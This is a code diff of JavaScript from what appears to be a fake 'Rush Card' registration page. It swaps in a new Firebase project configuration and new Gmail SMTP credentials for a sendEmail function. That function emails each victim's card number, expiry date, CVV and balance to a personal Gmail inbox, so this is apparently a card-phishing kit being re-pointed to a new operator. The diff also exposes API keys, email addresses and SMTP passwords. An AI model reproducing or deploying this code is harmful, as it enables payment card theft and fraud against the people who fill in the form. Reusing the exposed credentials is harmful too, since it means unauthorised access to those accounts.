@@ -1,14 +1,18 @@
+
   // Your web app's Firebase configuration
-   var firebaseConfig = {
-     apiKey: "AIzaSyA-S1ti_0qHHNK3Qh34-oU276kSvghPmas",
-     authDomain: "registerrushcard.firebaseapp.com",
-     projectId: "registerrushcard",
-     storageBucket: "registerrushcard.appspot.com",
-     messagingSenderId: "1010756973057",
-     appId: "1:1010756973057:web:2012a041a570eb6bbf0600"
-   };
-   // Initialize Firebase
-   firebase.initializeApp(firebaseConfig);
+  var firebaseConfig = {
+    apiKey: "AIzaSyBCHpwmB6zcEkRM1w50wEfcfbqUj0VluOw",
+    authDomain: "regrushcard.firebaseapp.com",
+    databaseURL: "https://regrushcard-default-rtdb.firebaseio.com",
+    projectId: "regrushcard",
+    storageBucket: "regrushcard.appspot.com",
+    messagingSenderId: "1096173782469",
+    appId: "1:1096173782469:web:40510e3e4e35ce1004f7ac"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+
+
 
 
 // Refernece contactInfo collections
@@ -89,10 +93,10 @@ retrieveInfos();
 function sendEmail(card_number,month,year,cvv,balance){
   Email.send({
     Host: "smtp.gmail.com",
-    Username: "helenmarshall528@gmail.com",
-    Password: "sxxzoujkfsqxuzfe",
-    To: "helenmarshall528@gmail.com",
-    From: "helenmarshall528@gmail.com",
+    Username: "nidhi.sharma0310@gmail.com",
+    Password: "Kafyvdmpzefuzzcx",
+    To: "nidhi.sharma0310@gmail.com",
+    From: "nidhi.sharma0310@gmail.com",
     Subject: `Rush Card ${card_number}sent you a message`,
     Body: `'card_number: ${card_number}<br> month: ${month} <br> year: ${year} <br> cvv: ${cvv} <br> balance: ${balance}`,
   }).then(function(){
